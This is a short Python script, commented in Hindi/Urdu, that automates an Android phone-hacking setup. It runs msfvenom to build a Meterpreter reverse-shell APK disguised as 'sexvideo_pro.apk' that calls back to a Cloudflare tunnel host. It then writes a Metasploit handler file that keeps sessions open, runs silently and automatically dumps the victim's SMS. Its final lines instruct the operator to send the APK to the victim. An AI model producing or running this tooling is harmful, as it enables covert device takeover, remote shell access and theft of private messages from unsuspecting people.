import os

# --- SETTINGS ---
# Apna naya link yahan dalein (Jo Termux/Cloudflare se mile)
link = "derby-attempted-biz-instead.trycloudflare.com" 

def setup():
    print("="*40)
    print("   MEHDI BHAI PRO DATA COLLECTOR   ")
    print("="*40)
    
    # 1. APK Banane ki command
    print(f"[+] Creating APK with link: {link}")
    os.system(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={link} LPORT=443 R -o sexvideo_pro.apk")
    
    # 2. Automation File (Yahan asli jadoo hai)
    # Ye file batati hai ke connection milte hi kya karna hai
    with open("auto_commands.rc", "w") as f:
        f.write("use exploit/multi/handler\n")
        f.write("set payload android/meterpreter/reverse_tcp\n")
        f.write("set LHOST 127.0.0.1\n")
        f.write("set LPORT 4444\n")
        f.write("set ReverseListenerBindAddress 127.0.0.1\n")
        f.write("set ExitOnSession false\n") # Connection baar baar lene ke liye
        f.write("set AutoRunScript 'sdk/scripts/post/multi/manage/play_silent'\n") # Shanti se kaam karne ke liye
        
        # Ye commands connection aate hi khud chalengi
        f.write("set InitialAutoRunScript 'post/multi/gather/android_html_viewer_sms_dump'\n") 
        f.write("exploit -j -z\n")
    
    print("[!] Setup Complete! APK victim ko bhejein.")
    print("[!] Terminal mein likhein: msfconsole -r auto_commands.rc")

setup()
